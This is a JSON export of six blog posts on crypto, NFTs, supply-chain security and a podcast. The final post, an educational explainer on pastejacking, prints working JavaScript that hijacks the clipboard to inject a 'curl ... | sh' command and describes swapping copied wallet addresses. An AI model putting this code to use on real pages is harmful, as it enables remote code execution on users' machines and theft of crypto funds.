[
  
  {
    "title"    : "Void Pool: Dive into the Abyss of Grimdark Finance",
    "category" : "blog",
    "url"      : "/blog/void-pool-dive-into-the-abyss-of-grimdark-finance",
    "date"     : "September 5, 2023",
    "excerpt"  : "Today, I present an enticing invitation to dive deep into the shadowy, interwoven realms of finance, politics, and technology. Enter Void Pool, a uniquely grimdark finance podcast that promises to be an illuminating journey like no other.\n\n##$$ Me...",
    "content"  : "Today, I present an enticing invitation to dive deep into the shadowy, interwoven realms of finance, politics, and technology. Enter Void Pool, a uniquely grimdark finance podcast that promises to be an illuminating journey like no other.\n\n##$$ Meet the Void Pool Hosts\nVoid Pool stands out, not just because of its thematic richness, but because of the formidable hosts that anchor its narrative:\n\nVoid Lord\n\n\nWith a seasoned background from the corridors of Wall Street and the tech giant realms of Google, Void Lord offers insights that combine the world of finance with the cutting-edge disruptions of tech.\n\nVoid Knight\n\n\nBringing a blend of experience in cybersecurity, fintech, and defense, Void Knight demystifies the intricate connections between money, security, and geopolitics.\n\nThese are not just any hosts; they are characters with layers, stories, and a passion to share knowledge.\n\nWhat Can You Expect?\nVoid Pool bridges the gap between economics and real-world applications, combining rigorous economic analysis with discussions on current events, politics, and prospective futures. It’s not just about understanding the world but about shaping and improving our lives amidst the ever-changing landscape.\n\nThough there is no shortage of finance podcasts to choose from, Void Pool stands as it brings in elements of dark fantasy to demonstrate basic principles. The grimdark theme ensures that the podcast maintains an authentic touch, addressing complex subjects without sugar-coating, thus preparing listeners for the challenges of the real world.\n\nWhy Plug Into Void Pool?\nIn our hyperconnected era, it’s no longer sufficient to understand just one aspect of the world. Void Pool offers:\n\nComprehensive Insights: In an age where the lines between politics, society, and economics are increasingly blurred, it’s critical to have a holistic understanding of global events. Void Pool doesn’t just regurgitate the news; it interprets, analyzes, and predicts, helping you be better prepared for what’s next.\n\nPractical Wisdom: The podcast doesn’t shy away from the harsh realities and complexities of the modern world, making for a listening experience that is as intellectually stimulating as it is emotionally resonant. Void Pool help listeners navigate and leverage economic shifts in daily life.\n\nEntertainment: With bonus content like comics and news, the learning is not just profound but also enjoyable.\nIn essence, it’s a complete package that elevates your understanding while keeping you entertained.\n\nStay in the Loop with Void Pool!\nTo ensure you never miss out on their gripping discussions, news, or the exclusive comics, follow them on Void Pool Twitter.\n\nDive into the Abyss of Grimdark Finance\nVoid Pool is more than just a podcast—it’s a movement, a philosophy, a guide to the mysteries of the financial world, and beyond. I invite you to embark on this journey with Void Lord and Void Knight. Equip yourself with the knowledge and wisdom that goes beyond the mundane and dives deep into the abyss.\n\nListen to Void Pool today\n"
} ,
  
  {
    "title"    : "Mycelial Lessons for Securing the Software Supply Chain",
    "category" : "blog",
    "url"      : "/blog/mycelial-lessons-for-securing-the-software-supply-chain",
    "date"     : "February 10, 2023",
    "excerpt"  : "Fungus plays a vital role in breaking down dead and old material in forests, and in a similar way, it can also help us learn to replace legacy software and eliminate tech debt. Just as fungus decomposes fallen trees and other organic matter, legac...",
    "content"  : "Fungus plays a vital role in breaking down dead and old material in forests, and in a similar way, it can also help us learn to replace legacy software and eliminate tech debt. Just as fungus decomposes fallen trees and other organic matter, legacy software can be broken down and replaced with more modern and efficient alternatives.\n\nTech debt refers to the cost of maintaining and updating older software systems that are no longer supported or have become obsolete. This can be a significant burden on organizations, as they must devote resources to maintaining and updating systems that are no longer providing the desired functionality or performance. In the same way, dead and old material in a forest can become an obstacle to growth and progress.\n\nI’m lucky enough to live in San Francisco, in the heart of the redwood coast. I’ve recently had luck foraging mycorrhizal mushrooms that grow in abundance here.\n\n\n\nThe relationship these mushrooms have with their environment made me realize several things about software supply chain security.\n\nMycelial Lessons in Handling Tech Debt\n\nJust as fungus helps to break down dead and old material in the forest, legacy software can also be broken down and replaced with new software that is better suited to the organization’s needs. This replacement process can be challenging, as it requires a significant investment of time and resources. But, in the long run, it can save organizations a great deal of money and improve their overall efficiency.\n\nOne way to approach the process of replacing legacy software is to take a phased approach, similar to how a forest will decompose a fallen tree. Instead of trying to replace all the software at once, organizations can start by replacing the most critical systems first, and then gradually work their way through the rest of the software. This can minimize the risk of disruption to the organization’s operations while also allowing them to take advantage of the benefits of new software more quickly.\n\nIn conclusion, just as fungus plays a vital role in breaking down dead and old material in forests, it can also help us to learn how to replace legacy software and eliminate tech debt. Organizations can minimize disruption and improve efficiency by taking a phased approach and focusing on critical systems first. By breaking down tech debt, organizations can free up resources to invest in more strategic initiatives. This can lead to more innovation, better performance, and better end-user experience.\n\nBenefits of Deprecating Legacy Software\n\nLesson 1) Break Down Old, Dead Material\n\nThe mycelium’s relationship with decay highlights the importance of continuously removing dead and old material to support growth and progress. In a similar way, deprecating and replacing legacy software with modern software built adhering to modern security standards can help improve software supply chain security by reducing the risk of vulnerabilities and attacks.\n\nIn addition, modern software is updated regularly with security patches and new features, helping to keep systems secure and prevent security incidents. By replacing legacy software with modern software, organizations can take advantage of the latest security protocols and technologies, reducing the risk of cyberattacks and data breaches. This, in turn, helps to build trust in the software supply chain and ensures that sensitive information is protected from cyber threats. Overall, the benefits of modern software for software supply chain security are significant, and organizations that prioritize deprecating and replacing legacy software are well-positioned to protect their digital assets and maintain a strong security posture.\n\nLesson 2) Adapt and Evolve\n\nThe mycelium’s ability to adapt and evolve in response to changes in its environment is a powerful example of resilience and the importance of continuous improvement. Deprecating and replacing legacy software with modern software built to meet today’s security standards can improve the resilience of the software supply chain and increase its ability to respond to changing threats and vulnerabilities.\n\nModern software is built to adhere to current security standards and is designed to address the latest security threats. For example, modern software may include features like encryption, multi-factor authentication, and firewalls to prevent unauthorized access to sensitive information. These features help to prevent cyberattacks and reduce the risk of data breaches.\n\nLesson 3) Support Growth and Renewal\n\nThe mycelium’s role in breaking down dead and old material to support growth and renewal is similar to the role of deprecating and replacing legacy software in promoting software supply chain security. By removing older, unsupported software and replacing it with modern software built to meet current security standards, organizations can reduce their risk of attacks and increase their ability to respond to changing security threats. This can help ensure the long-term health and security of the software supply chain.\n\nDeprecating and replacing legacy software with modern software built with modern security standards is critical for the security of the software supply chain. Legacy software systems, by their very nature, are vulnerable to exploitation due to outdated security protocols, lack of security updates, and other factors. These systems can easily become a target for cyberattacks, leading to data breaches, theft of sensitive information, and other security incidents.\n"
} ,
  
  {
    "title"    : "Disaster Recovery Drills in Web 3.0",
    "category" : "blog",
    "url"      : "/blog/disaster-recovery-drills-in-web-3",
    "date"     : "June 12, 2022",
    "excerpt"  : "I spent several hours tracking down a small notebook earlier this week. The reason? I wrote down my seed phrases in this tiny notebook, which I carelessly tracked. Why am I telling you this? This management strategy is a horrible practice. Had I n...",
    "content"  : "I spent several hours tracking down a small notebook earlier this week. The reason? I wrote down my seed phrases in this tiny notebook, which I carelessly tracked. Why am I telling you this? This management strategy is a horrible practice. Had I not performed a disaster recovery drill for my digital assets, I might’ve continued storing my seed phrase insecurely. Disaster recovery drills are foundational for security in web 3.0 and enable continued access to blockchain assets.\n\nWeb 3 Wallet Security Basics\n\nSecuring your seed phrase is foundational to security because the seed phrase is the cryptographic basis for accessing the wallet. The seed phrase represents a long string of random numbers — and your wallet uses it to generate the private keys that let you send and spend your crypto. Individuals and institutions should securely secure their wallet seed phrases in multiple locations and, ideally, partitioned. Without the seed phrase, wallet owners will have no recourse for recovering their wallets.\n\nThere are well-established standards for storing seed phrases. The best practices boil down to:\n\n\n  Store your seed phase in multiple locations.\n  Ensure access to your seed phrase is sufficiently restricted.\n  If feasible, only store parts of the seed phrase at any one site to avoid a single point of compromise.\n  Factor in the possibility of a natural disaster–it may be worth creating etched plates to hold parts of a seed phrase rather than hoping pieces of paper survive a fire, flood, or other acts of g*d.\n  Memorize your seed phrase–you could get hit by a bus, but if you can find a hardware wallet in heaven, you’ll have access to your digital assets. (This is obviously a joke – crypto degens don’t go to heaven)\n\n\nWallet owners will inevitably make tradeoffs between security and convenience, but this is par the course for making security decisions. Retaining your seed phrase is fundamental to maintaining access to your digital assets; therefore, protecting this seed phrase should be the top priority of a wallet’s owner.\n\nBack-Up Private Keys\n\nCreating a backup of private keys is fundamental for creating a successful disaster recovery plan for digital assets. Wallets generate private keys using the seed phrase as input. Seed phrases and private keys aren’t the same, although both allow someone to spend coins in a wallet.\n\nThere are two main approaches for maintaining secure custody of private keys, depending on the responsible entity type:\n\n\n  For individual users, store your private keys securely. The best practices for storing this data are comparable to the above guidelines for storing seed phrases. Utilizing a hardware wallet for long-term storage is the most secure option to mitigate the risk to your private keys.\n  For institutions, store private keys within a secure secret manager, such as Vault or AWS Secrets Manager. Wallet custodians should treat these private keys like credentials and other secrets. To state the obvious: private keys, regardless of form, should never be stored in plain text internally nor on the blockchain.\n\n\nWeb 3 Disaster Recovery For Developers:\n\nDisasters affect developers too. Thus, it is in the best interest of developers who touch decentralized applications to have a well-thought-out, well-tested disaster recovery plan mapped out. For example, consider all the points of access developers need to take a dApp from code to deployment. Not only should developers take care to protect their wallets, but they should protect access to their code and deployment infrastructure and should develop a contingency plan to handle hacks and other business logic exploits which may come to light.\n\nAn average deployment on leading blockchains can cost thousands of dollars. For this reason, organizations should protect developer access to deployed applications–this entails planning around the risk of developer lockout and enforcing access controls. Access restrictions implemented according to the principle of least privilege help ensure workflow recovery is possible–take steps to ensure you build with the ability to update, patch, and recover access to deployed smart contracts.\n\nHandling Tech Debt\n\nIn the same way that entropy is inevitable to any physical system, tech debt is a byproduct of the early, do-or-die stages of product development. Once the product has a bit of runway to work with, major refactors can be necessary to improve performance and address any other rickety implementations. This friction in the SDLC introduced by tech debt can lead to immediate and later insecurities if left uncorrected.\n\nIn addition, tech debt can lead to churn that harms developer velocity. Continuously fighting with poorly implemented routines, wrangling complicated test cases, and deciphering unconventional logic takes a toll on productivity. Reimplementation comes with costs, but the learning acquired throughout the MVP development process often allows for higher quality. This refactoring can make it easier to add features and capabilities on top of existing applications.\n\nSecurity Training and Assistance\n\nOne of the best ways to help prevent security vulnerabilities from escaping to your smart contract or live dApp is to institute security training for developers. This security awareness is especially pertinent for developers of exchanges and other DeFi applications, especially since exploitable bugs can appear in the smart contracts, and the dApp frontend provides an additional attack surface if not carefully guarded.\n\nTo improve the security of applications interacting with payment card data, PCI DSS 6.5 requirements state that the developers must receive regular security training at least once a year. Though regulation on digital assets is still underway, organizations will see the benefits of providing basic security training to developers in terms of time saved resolving bugs and other vulnerabilities.\n\nOne may even recommend solutions that entail automated remediation as a solution, as a means of maximizing the time saved–such tools can even help train developers to support improvements to an organization’s security posture.\n\nBottom line: Ensure sufficient security training for developers and foster a culture of pride in the quality, and it’ll pay off both figuratively and literally.\n\nRecovery Drills for Cryptocurrencies and Digital Assets\n\nThere’s no stand-in for actual disaster recovery practice. Developers should undergo manual wallet recovery training to practice saving digital assets since there are no second chances when it comes to cryptographic assets. Though new digital asset regulation has been hinted at to help mitigate the risks imposed by cryptocurrencies, NFTs, and other assets tied to cryptographic wallets, early adopters are still mainly on their own regarding the security of their assets.\n\nEven after regulation hits, every wallet owner should create and test a plan for their digital asset recovery–it’s the best way to ensure the success of a contingency plan–just make sure you don’t lock yourself out while testing.\n\nCyber-attacks have hit crypto exchanges, dApps, and other web 3 projects. The Architectural &amp;amp; Security Initiatives for Decentralized Software Security Framework (ACID-SF) is an experimental cybersecurity framework designed to help improve web 3.0 project security. The ultimate goal of this framework is to enable project stakeholders to make more informed cybersecurity decisions.\n"
} ,
  
  {
    "title"    : "Crypto Executive Order Explained",
    "category" : "blog",
    "url"      : "/blog/crypto-executive-order-explained",
    "date"     : "May 2, 2022",
    "excerpt"  : "Cryptocurrency has seen dramatic growth since its inception in 2009. Around 16% of American adults have invested in cryptocurrencies. In theme with prior executive orders advancing US cyber policy, the White House recently signed an executive orde...",
    "content"  : "Cryptocurrency has seen dramatic growth since its inception in 2009. Around 16% of American adults have invested in cryptocurrencies. In theme with prior executive orders advancing US cyber policy, the White House recently signed an executive order on cryptocurrencies and other digital assets. Crypto enthusiasts view this as a win, but what does ensuring the responsible development of digital asset mean for the average American?\n\nKey Measures of the Executive Order\n\nBiden’s Executive Order entails several vital measures to help harness the potential benefits of crypto, blockchain, and other digital assets.\n\n\n  Protect U.S. Consumers, Investors, and Businesses\n\n\nThe stated protection entails developing an official policy to address systemic economic risks introduced by cryptocurrency. This entails developing regulatory measures for decentralized applications. Recent announcements from the SEC demonstrate that they are aware of the threats to investors and developers that exist because of rugpulls and other forms of scam.\n\n\n  Protect the U.S. and Global Financial Stability and Mitigate Systemic Risk\n\n\nThe Financial Stability Council will identify systemic financial risks imposed by crypto and develop policy to help mitigate identified risks. This includes risk related to moral hazard, the lack of know-your-customer controls, and other dangers introduced by the crypto ecosystem.\n\n\n  Mitigate the Illicit Finance and National Security Risks Posed by the Illicit Use of Digital Assets\n\n\nBoth the beauty and the dangers of crypto lie in its ability to transfer money without a central authority. Many have gained the change to leave oppressive regimes, safely fund activism, and perform reanactments of Fear and Loathing, however, cryptocurrency has also provided a route for funding terrorism. Mitigating the risks imposed by will only be possible with unity. This executive order pushes for federal policy and international policy to be developed and enforced.\n\n\n  Promote U.S. Leadership in Technology and Economic Competitiveness to Reinforce U.S. Leadership in the Global Financial System\n\n\nThis executive order directs the Department of Commerce to develop a framework to help promote research and secure the development of industry-leading solutions involving digital assets. This rapid-development framework will serve as a foundation for agencies and integrate this as a priority into their policy, research and development, and operational approaches to digital assets.\n\n\n  Promote Equitable Access to Safe and Affordable Financial Services\n\n\nCrypto has made financial services more accessible, allowing access to those disenfranchised or otherwise excluded from traditional banking systems. However, this lack of Know your Customer controls introduces systemic risk.\n\nAllowing the otherwise unbanked access to crypto services is important to supporting equity within the crypto space, which the executive order seems aware of.\n\n\n  Support Technological Advances and Ensure Responsible Development and Use of Digital Assets\n\n\nThe U.S. Government will take concrete steps to study and support technological advances in the responsible development, design, and implementation of digital asset systems. Their prerogative prioritizes instilling privacy and security into the management of digital assets while combating illicit exploitation.\n\nPart of the stated responsibility of the US government is to reduce the negative climate impacts of digital assets. This may include investment in more ecologically sustainable energy sources to help power the infrastructure and proof-of-work calculations linked to cryptographically provable assets.\n\n\n  Explore a U.S. Central Bank Digital Currency\n\n\nExploring the potential establishment of a digital form of the fiat US dollar is the final key measure of the executive order. The Federal Reserve shall throughly research the prospects of establishing a national currency; should it make sense and be deemed in the nation’s best interest, the US shall move forward in developing a CBDC.\n\nThe Future of Ensuring Responsible Development of Digital Assets\n\nThis executive order is more descriptive than prescriptive, falling in line with guidelines such as the NIST SSDF. As the key measures are explored and mature, we can expect guidance to take a more solid form.\n\nOften, the patterns of the past give clues about the future. The 1913 Federal Reserve Act, passed in the wake of the turn of the century banking crises, created the current Federal Reserve System and introduced a central bank to oversee U.S. monetary policy. This policy was deemed necessary because of the inability of the market to achieve stability in a laissez-faire environment.\n\nHistorians may compare Biden’s executive order on crypto to the monetary policies introduced a century ago. The most significant impact of this executive order will be the introduction of compliance standards and regulations design to hold institutions accountable.\n\nWhile the introduction of crypto compliance standards may shock current digital asset service providers, this will also increase the number of older institutions that choose to enter the blockchain asset space. With 32% of crypto owners stating they would consider crypto services provided directly through their banks, these banks have an incentive to dip their toes into offering cryptocurrency amenities.\n\nNavigating Today’s Crypto Landscape\n\nIn the long run, the introduction of compliance standards will improve the accessibility of crypto and provide more protections for everyday users. However, we do not yet have outlined best practices available for web 3 development, which puts this ecosystem at heightened risk.\n\nFor individual asset holders, the optimal approach is to follow defacto best practices for digital asset security. These practices include:\n\n\n  Performing disaster recovery drills for hot, cold, and paper wallets.\n  Preventing physical access to hardware wallets.\n  Utilizing 2FA or MFA for authentication.\n  Maintaining separate hot wallet(s) for daily transactions while storing the rest of your crypto assets in a cold wallet(s).\n  Staying vigilant against socially engineered attacks, such as phishing emails, pastejacking attacks, and malicious ads.\n\n\nConclusion\n\nThis executive order demonstrates that necessary investigations are underway regarding how we can utilize blockchain technologies to maximize societal benefit. These compliance requirements will hopefully push web 3 builders to adopt secure practices in their application development and deployment processes.\n"
} ,
  
  {
    "title"    : "Maximizing the Benefit and Utility of Minting NFTs",
    "category" : "blog",
    "url"      : "/blog/maximizing-the-benefit-and-utility-of-minting-nfts",
    "date"     : "March 13, 2022",
    "excerpt"  : "NFTs have been a hot trend in tech but face criticism regarding their lack of obvious utility. I started this off as a vent post for my frustration regarding the current discourse around NFTs. Still, I decided about midway through that energy migh...",
    "content"  : "NFTs have been a hot trend in tech but face criticism regarding their lack of obvious utility. I started this off as a vent post for my frustration regarding the current discourse around NFTs. Still, I decided about midway through that energy might be better spent trying to help answer the pertinent questions: What are the benefits of minting NFTs, and how can we maximize the utility of NFTs?\n\nThis post will start with my preamble of the problem existing with current common viewpoints, describe the technology behind NFTs in a way that makes sense to a human, and discuss the potential applications of this technology that can, with any luck, help further the discussion surrounding the use of NFTs.\n\nThe Problem with the Current Approach to NFTs\n\nThe tragedy of commons isn’t a new idea, having origins in Greek antiquity. NFTs are still a new concept, but they have seen widespread exposure. The utility of minting NFTs is not well defined; we will waste energy in extraneous applications of blockchain technologies until we understand the benefits.\n\nTo understand the usefulness of this emerging technology, we must first understand the nature of the technology behind NFTs.\n\nSentiment regarding NFTs stands inverse to knowledge surrounding NFTs:\n\n\n\nThat annoying, MLM-pitching guy on Instagram posting about crypto and NFTs bragging about how it’s the future? He has no idea how blockchain technology works nor the benefits of such applications. The self-righteous netbanger virtue signaling how they don’t want to contribute to capitalism and pollution? They are correct about the unsustainability but are missing the obvious solution.\n\nThere is an issue rooted in the more significant problem of human unsustainability in many categories, including methods of energy generation. This failure should not reflect on the technical abilities of an immature technology. If you:\n\n\n  \n    drive a personal car,\n  \n  \n    play video games, or\n  \n  \n    use air conditioning,\n  \n\n\nthen your anger is misplaced. This statement doesn’t intend to exemplify a tu quoque fallacy but direct attention to what energy sources are familiar–coal, gas, or another nonrenewable. Our system is at fault, not this tool.\n\nNFTs are data defined on the blockchain. The technology is only as powerful as the application.\n\nBeyond this lack of understanding, we don’t lead with the key benefits to minting NFTs. There is an obsession with the ability of NFTs to provide ownership. This common consensus is warped–the power of NFTs to provide origination proof is the most significant benefit of the technology.\n\nPut another way, NFTs are ultimately just tools. Holding such strong sentiment about a tool makes about as much sense as raging against the concept of hammers. Having a solid opinion regarding hammers makes more sense than dying on any hill related to NFTs since:\n\n\n  the use case of hammers is defined and well established\n  the technology surrounding hammers is mature\n\n\nTo properly use a tool, one must understand the benefits. What can the technology do efficiently? The answer to this question leads us to achieve utility for NFTs.\n\nThe Key Benefits to Minting NFTs\n\nImmutable\n\nOnce a person mints an NFT, the decentralized ledger stores the uploaded data forever. This data cannot be modified, making disputes regarding the ownership history of a digital asset a thing of the past. No one may change information uploaded to the blockchain through the minting process.\n\nThis attribute of immutability is a double-edged sword; if clerical errors are introduced and not corrected before minting, they are propagated across the nodes of the system and cannot be modified. The lack of remediation options is a crucial downside to using a public blockchain: with no central authority, no resource exists to remediate mistakes or provide reassurance of ownership–it is for the same reason that nearly 1 in 5 bitcoins are lost forever.\n\nDecentralized\n\nThe decentralized nature of blockchain technology means that users may readily access data stored in this ledger. In addition, it is nearly impossible to tamper with data within this ledger. The only “feasible” way to tamper with decentrally stored data is to simultaneously tamper with each blockchain node.\n\nData stored on the blockchain is much more readily available than from non-distributed ledgers, thus improving the accessibility of the data. This plays a part in preventing retrieval delays and bottlenecks that can occur with centralized databases that don’t take advantage of CDNs.\n\nThe three main pillars of information security include confidentiality, integrity, and availability. The decentralized nature of blockchain-bound assets, including NFTs, allows for verification of the integrity and availability of data. However, as all data tied to the blockchain is publically available, confidentially cannot be expected. Credentials and secrets, regardless of encryption, should never be added to the immutable ledger.\n\nSmart Contract Bound\n\nNFTs may utilize smart contracts as part of their design. A smart contract is the agreement-in-code within the blockchain, enabling the network to store the information indicated within an NFT transaction. This smart contract may be reused as a means of transferring NFT ownership from wallet to wallet.\n\nSmart contract developers may bake usage stipulations into the NFT. This capability unlocks possibilities for artists: royalties may be hardcoded into the smart contract. We have already seen disruptions within the art world resulting from the fact that artists can now profit from their art in the short term–one doesn’t have to come from money to survive as an artist.\n\nUse Cases Maximizing NFT Utility\n\nNow that we have laid out the benefits provided by NFTs let’s discuss use cases taking these benefits into account.\n\nProof of Origination / Provenance\n\nTracing the custodial history of an asset is not a new concept–provenance helps establish an item’s significance and value based on its chain of ownership. The decentralized, immutable nature of the blockchain means that interested parties may trace the provenance of an NFT through the ledger.\n\nAs evidenced in Moxie’s demonstration, the NFT’s integrity is only as strong as the integrity of the utilized hosting service and the authenticity of the 3.0 implementation. If a service is inauthentic in its use of Web 3.0 architecture (looking at you OpenSea) and the host has a mind to tamper with the content, there is no guarantee that the content has not been corrupted.\n\nBecause of the expensive and rising gas costs, it’s unrealistic to expect public blockchains to store ever-growing file sizes. Thus, holding the entirety of an image on the blockchain is unrealistic for most applications.\n\nTo counter this, we may use a form of validation to ensure data integrity. For example, verifying the originality could be performed by visual cryptography. However, the origination point referenced when the creator mints the NFT is immutable even without validation. Therefore, minting an NFT establishes a point of origination that ties a work back to the original wallet regardless of the number of total transactions.\n\nCertification\n\nThe fact that the reference is immutable and the origination of NFTs is reliable makes this digital asset perfect for providing a form of certification, such as a diploma, an accreditation, or another form of a certificate. For this use case, using an NFT to represent a certificate takes advantage of the proof of origination capabilities to provide enhanced verification of authenticity. If the issuing institution publically lists the wallet used to generate NFT certificates, interested parties can prove the certificates by scanning for the originating address. Forging a paper of digital document is easy, but faking origination tied to a wallet address is next to impossible.\n\nDepending on the specific implementation and the terms outlined in the smart contract, developers building this underlying smart contract may make this certificate to expire after a particular timestamp. This functionality solves an additional problem: checking whether accreditation is expired, revoked, or otherwise invalid.\n\nUntamperable Checksums\n\nChecksums are small, byte-sized blocks of data derived from a source of data. They are used to detect errors that transmission or storage may have introduced. Developers often use checksums to verify data integrity, but since they do not contain origination information, we cannot verify data authenticity.\n\nCreating checksum NFTs solves the problem of verifying data authenticity because relevant stakeholders may prove the origination of these checksums. Because these NFT checksums are immutable and decentralized, organizations may use them to guarantee that errors and tampering have not occurred.\n\nConclusion: Maximizing the Benefits of NFTs\n\nHere’s the bottom line: NFTs and even blockchain broadly are technologically immature. Necessity existing as the mother of invention is dead: instead, we unlock capabilities and flail about seeking optimal applications. We must understand the benefits of the technology to maximize the tool’s utility. These include:\n\n  The immutability of information added to public blockchains.\n  The decentralized nature of NFT storage.\n  The guaranteeds offered by smart contracts.\n\n\nWe’re looking at NFTs in their dial-up phase. The 90s Yahoo version. The AOL messenger phase. The first phase of smart-contract bound digital assets is here. It’s crude, nebulous, and not well explored, but to explore the unknown is human—the frontier beckons.\n"
} ,
  
  {
    "title"    : "Pastejacking Smart Contracts: Replacing Wallet Addresses to Steal Data",
    "category" : "blog",
    "url"      : "/blog/pastejacking-smart-contracts",
    "date"     : "December 31, 2021",
    "excerpt"  : "The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particul...",
    "content"  : "The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality.  This form of attack, commonly referred to as pastejacking, can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.\n\nPastejacking attacks exploit temporary storage memory by replacing copied data stored in device memory with different, often malicious, data. This exploit may take the form of a client-side or a server-side attack.\n\nServer-side pastejacking attacks may fit within a software supply chain attack: attackers can manipulate a compromised entity to attack downstream users or clients. \nUsing methods such as cross-site scripting (XSS) attacks, an attacker can wage client-side pastejacking attacks, which can be especially effective if targeting developers. Cyberattacks waged on developers often have a high return on investment because capturing developer credentials affords an attacker a significant amount of lateral movement throughout an organization.\n\nHow Javascript Pastejacking Works\n\nFor demonstration purposes, let’s take a look at the following Javascript code snippet:\n&amp;lt;script&amp;gt;\ndocument.getElementById(&#39;copied-text&#39;).addEventListener(&#39;copy&#39;, \nfunction(e) {\n    e.clipboardData.setData(&#39;text/plain&#39;, \n        &#39;curl https://forkbomb.io/shadowrealm | sh\\n&#39;\n    );\n    e.preventDefault();\n});\n&amp;lt;/script&amp;gt;\n\n\nAttackers may execute this code through various means; this attack may be waged on an organization through a form of code tampering or used on individual users through a client-side injection attack.\n\nUsing Pastejacking to Attack Developers\n\nLet’s say a junior programmer is attempting to utilize a code snippet from StackOverflow, which is not an unusual scenario that most software engineers have done at some point in their career. A malicious entity wages an attack against users trying to copy and paste a code snippet from the web browser into their terminal.\n\nThe javascript function as defined above replaces the copied text within the clipboard, thus overriding the in-memory data and replacing it with:\ncurl https://forkbomb.io/shadowrealm | sh\\n\n\nThis string is a curl command that navigates a user to the URL https://forkbomb.io/shadowrealm, which in this case is a striking yet graceful warning to users.\n\nBecause the pasted snippet includes the string sh\\n, the command runs immediately as if the user had manually pressed the return key, thus preventing a user from realizing what is happening until the attack is underway.\n\nThis form of attack can be hazardous as this can be a form of targeting developers who often have elevated credentials. Malicious actors may use a pastejacking attack within systems that do not adhere to principles of least privilege. Developer credentials often allow escalated privileges to accelerate developer velocity. Allowing for greater access within a development ecosystem reduces security between components, thus permitting lateral movement that can give an attacker full access to an organization’s data. This can allow attackers to perform data exfiltration or leak source code; in either case, this will be devastating for an organization’s reputation and finances.\n\nUsing Pastejacking to Attack Crypto Wallets\n\nMore nefarious, if subtle, applications of this technique exist. Let’s consider crypto wallet addresses. These addresses are 26-35 characters long and consist of alphanumeric values. This address is often copied and pasted from one application to another to send crypto assets from one wallet to another. This copy and paste pattern provides a window of opportunity for attackers to wage a client-side injection attack utilizing such a script as defined above.\n\nMetamask is a popular crypto wallet commonly used for NFT transactions and blockchain applications. This wallet provides convenience to users by existing both in-browser and as a Google Chrome extension. One of the most convenient features is the fact that users can easily copy their crypto wallet address with a single click:\n\n\n\nYou can probably see where this is going. An insecure website, or nefarious browser extension, running this javascript copy-injection could hijack a user’s transaction by replacing the presented contract address text with another one, such as the attacker’s address, thus redirecting funds to their wallet permanently.\n\nIn the case of Metamask, tools such as LavaMoat are used to prevent software supply chain attacks from being deployed directly on its user base. However, as long as gaps within DevSecOps exist, attackers will find a way to wage attacks on users. Other means of attack, such as cross-site scripting attacks, are still viable pathways to reach individual users.\n\nPreventing Crypto Theft\nAs users of defi software, we are ultimaly responsible for our own financial safety. We advice several tips to mitigate the risk of crypto theft through pastejacking:\n\n  Always visually inspect the transaction page in MetaMask, or your preferred client before running every transaction.\n  At least double/triple check the first 4 characters of the contract to see that they match up.\n  Investigate suspicious contracts, especially if there is high outflow to another contract address.\n  If you do a lot of business on ethereum, use services like ENS to map a trusted domain name to your contract address\n\n\nUnfortunately if you have fallen victim to smart contract fraud, there is little recourse in remediation other than to continue using the platform using the guidance laid out in this post and exhibiting extreme caution when handling any amount of money/value you intend to preserve.\n\nKey Learnings for Defi Developers\n\nJust like the early stages of Web 1.0 and Web 2.0, underscoring security and trust within Web 3.0 will be the key to its widespread adoption.  The authentication and origination benefits that wallets such as MetaMask provide are compelling, however, they must be implemented with security in mind. For decentralized service providers, steps need to be taken to prevent code tampering, avoid unsafe development prctices, and protect those using the service.\n\n"
} 
  
]
